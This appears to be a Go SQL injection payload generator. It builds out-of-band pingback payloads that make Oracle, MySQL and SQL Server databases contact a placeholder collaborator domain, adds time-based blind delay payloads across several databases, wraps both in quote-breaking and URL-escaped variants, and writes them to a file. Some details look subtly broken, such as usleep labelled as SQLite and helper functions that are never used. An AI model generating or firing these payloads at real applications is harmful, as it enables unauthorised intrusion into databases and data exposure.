package main

import (
	"fmt"
	"net/url"
	"os"
	"strings"
)

// 修改后的payload生成逻辑（去依赖版）
var (
	expressionEmbeddings = []func(string) string{
		func(s string) string { return `'||(` + s + `)||'` },
		func(s string) string { return `"||(` + s + `)||"` },
		func(s string) string { return `(` + s + `)` },
		func(s string) string { return s },
	}

	statementEmbeddings = []func(string) string{
		func(s string) string { return `';` + s + `--` },
		func(s string) string { return `";` + s + `--` },
		func(s string) string { return `');` + s + `--` },
		func(s string) string { return `");` + s + `--` },
		func(s string) string { return s },
	}

	escapers = []func(string) string{
		func(s string) string { return s },
		url.QueryEscape,
		url.PathEscape,
	}
)

func expressionToStatement(s string) string {
	return `select (` + s + `);`
}

// 通用域名占位符
const collabDomain = "{COLLAB_DOMAIN}"

// 改造后的pingback生成函数
func generatePingbackPayloads() []string {
	var payloads []string

	pingbackTemplates := []struct {
		template string
		escape   bool
	}{
		// XML外部实体
		{`extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %% nswjq SYSTEM "http://%s/">%%nswjq;]>'),'/l')`, true},
		
		// 文件加载
		{`load_file('\\\\%s\\test')`, true},
		
		// SQL Server命令
		{`declare @q varchar(99);set @q='\\%s\\test'; exec master.dbo.xp_dirtree @q;`, true},
		{`attach database '\\\\%s\\test';`, true},
	}

	for _, escaper := range escapers {
		for _, embed := range expressionEmbeddings {
			for _, tpl := range pingbackTemplates {
				domain := collabDomain
				if tpl.escape {
					domain = strings.ReplaceAll(domain, ".", "'||'.'||'")
				}
				raw := fmt.Sprintf(tpl.template, domain)
				payload := escaper(embed(raw))
				payloads = append(payloads, payload)
			}
		}
	}

	return unique(payloads)
}

// 改造后的延时payload生成（支持1-10秒）
func generateDelayPayloads() []string {
	var payloads []string

	delayTemplates := []struct {
		template string
		seconds  int
	}{
		// MySQL
		{"sleep(%d)", 1},
		// SQLite
		{"usleep(%d000000)", 1},
		// PostgreSQL 
		{"pg_sleep(%d)", 1},
		// SQL Server
		{"waitfor delay '00:00:%02d'", 1},
	}

	for seconds := 1; seconds <= 10; seconds++ {
		for _, escaper := range escapers {
			for _, embed := range expressionEmbeddings {
				for _, tpl := range delayTemplates {
					raw := fmt.Sprintf(tpl.template, seconds)
					if strings.Contains(raw, ")") {
						raw += "+1" // 保持语句有效性
					}
					payload := escaper(embed(raw))
					payloads = append(payloads, payload)
				}
			}
		}
	}

	return unique(payloads)
}

// 去重工具函数
func unique(strs []string) []string {
	seen := make(map[string]bool)
	result := []string{}
	for _, s := range strs {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

func main() {
	// 生成payloads
	pingbacks := generatePingbackPayloads()
	delays := generateDelayPayloads()

	// 合并结果
	allPayloads := append(pingbacks, delays...)

	// 写入文件
	file, err := os.Create("sql_payloads.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	for _, p := range allPayloads {
		file.WriteString(p + "\n")
	}

	fmt.Printf("Generated %d payloads (Pingback:%d | Delay:%d)\n", 
		len(allPayloads), len(pingbacks), len(delays))
}
